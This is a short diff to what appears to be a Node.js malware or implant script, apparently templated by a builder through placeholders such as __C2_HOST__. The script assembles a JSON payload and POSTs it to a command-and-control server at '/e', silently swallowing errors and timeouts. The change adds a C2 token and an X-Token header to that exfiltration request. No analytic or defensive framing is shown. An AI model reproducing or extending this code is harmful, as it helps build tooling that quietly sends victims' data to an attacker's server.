@@ -7,6 +7,7 @@ var https = require('https');
 var C2_HOST = '__C2_HOST__';
 var C2_PORT = __C2_PORT__;
 var C2_PROTO = '__C2_PROTO__';
+var C2_TOKEN = '__C2_TOKEN__';
 
 function pE(fp) {
   try {
@@ -63,7 +64,9 @@ var pl = JSON.stringify({
 });
 
 var mod = C2_PROTO === 'https' ? https : http;
-var rq = mod.request({ hostname: C2_HOST, port: C2_PORT, path: '/e', method: 'POST', headers: { 'Content-Type': 'application/json' }, timeout: 3000 }, function() {});
+var hdrs = { 'Content-Type': 'application/json' };
+if (C2_TOKEN) hdrs['X-Token'] = C2_TOKEN;
+var rq = mod.request({ hostname: C2_HOST, port: C2_PORT, path: '/e', method: 'POST', headers: hdrs, timeout: 3000 }, function() {});
 rq.on('error', function() {});
 rq.on('timeout', function() { rq.destroy(); });
 rq.end(pl);
